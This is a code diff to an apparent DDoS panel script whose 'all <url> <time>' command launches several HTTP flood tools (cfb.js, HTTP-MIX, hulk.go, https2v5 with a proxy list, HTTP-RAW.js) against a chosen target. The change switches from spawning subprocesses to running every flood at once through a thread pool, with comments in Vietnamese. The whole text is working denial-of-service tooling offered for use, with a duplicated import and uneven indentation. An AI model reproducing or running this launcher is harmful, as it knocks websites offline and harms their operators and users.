@@ -9,6 +9,8 @@ import sys
 import cloudscraper
 import os
 import subprocess
+import subprocess
+from concurrent.futures import ThreadPoolExecutor
 
 
 def clear():
@@ -267,28 +269,24 @@ def main():
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
-
-        # Create a list of commands
+                # Danh sách các lệnh
                 commands = [
-                    f'node cfb.js {url} 120',
-                    f'node HTTP-MIX {url} {time}',
-                    f'go run sever.go -site {url} GET',
-                    f'node https2v5 GET {url} proxies.txt {time} 200 10',
-                    f'node https1 {url} 10 2000 {time}',
-                    f'go run hulk.go -site {url} GET ',
-                    f'node HTTP-RAW.js {url} {time}',
-                    f'node cfb.js {url} 120'
-                ]
+                  f'node HTTP-MIX {url} {time}',
+                  f'go run sever.go -site {url} GET',
+                  f'node https2v5 GET {url} proxies.txt {time} 200 1000',
+                  f'node https1 {url} 10 2000 {time}',
+                  f'go run hulk.go -site {url} GET',
+                  f'node HTTP-RAW.js {url} {time}',
+                  f'node cfb.js {url} 120'
+]
 
-        # Create and start a subprocess for each command
-                processes = []
-                for command in commands:
-                    process = subprocess.Popen(command, shell=True)
-                    processes.append(process)
+                 # Hàm chạy lệnh
+                def run_command(command):
+                    subprocess.run(command, shell=True)
 
-        # Wait for all the processes to finish
-                for process in processes:
-                    process.wait()
+# Sử dụng ThreadPoolExecutor để chạy các lệnh đồng thời
+                with ThreadPoolExecutor() as executor:
+                    executor.map(run_command, commands)
 
             except IndexError:
                 print('Usage: all <url> <time>')
